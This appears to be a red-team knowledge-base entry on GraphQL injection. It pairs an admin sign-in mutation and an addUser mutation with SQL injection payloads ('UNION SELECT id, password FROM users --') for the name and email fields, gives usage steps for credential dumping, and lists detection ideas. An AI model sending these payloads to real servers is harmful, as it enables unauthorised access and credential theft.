---
type: code
language: graphql
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - graphql
  - injection
  - mutation
validated: true
---

# GraphQL-Mutations-for-Injection-Attack

## Code

```graphql
# mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
# mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
```

## Description

This code snippet contains two GraphQL mutations: one for admin sign-in to obtain a token, and another for adding a user which serves as the injection vector. The addUser mutation can be modified to include SQL injection payloads in fields like name and email, assuming backend vulnerabilities allow query tampering to steal credentials.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| login | Admin username for signIn | Admin |
| password | Admin password for signIn | secretp@ssw0rd |
| id | User ID in addUser | 1 |
| name | Name field (injection point) | Dan Abramov' UNION SELECT id, password FROM users -- |
| email | Email field (injection point) | dan@dan.com' -- |

## Usage

Embed these mutations in HTTP POST requests to the GraphQL endpoint as JSON payloads (e.g., via curl). First execute signIn to get the token, then use it to authorize addUser with injected payloads. Ideal for exploiting misconfigured GraphQL servers in web apps for credential dumping or account creation during red team engagements.

## Detection

- Monitor GraphQL query logs for anomalous mutations with UNION SELECT or comment terminators (--).
- Enable rate limiting on mutations and alert on high complexity queries.
- Backend SQL logs showing concatenated user inputs or error messages indicating injection attempts.
- WAF rules to block payloads containing SQL keywords in GraphQL inputs.

## Related

- [[procedures/GraphQL-Injection-via-Mutations-for-Credential-Theft-and-User-Addition]]
